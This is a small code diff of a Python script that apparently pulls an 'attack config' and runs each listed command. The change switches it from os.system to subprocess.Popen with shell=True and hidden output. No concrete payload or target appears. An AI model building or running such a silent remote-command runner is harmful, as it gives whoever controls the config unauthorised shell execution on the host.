@@ -1,6 +1,7 @@
 import json
 import os
 import requests
+import subprocess
 from logIP import log_ip
 
 def init():
@@ -16,8 +17,8 @@ config_dict = get_attack_config()
 cmds = config_dict['cmds']
 for cmd in cmds:
 	try:
-		os.system(cmd)
+		subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 	finally:
-		print("Finish cmd:" + cmd)
+		print("Execute cmd:" + cmd)
 
 print("Exit")
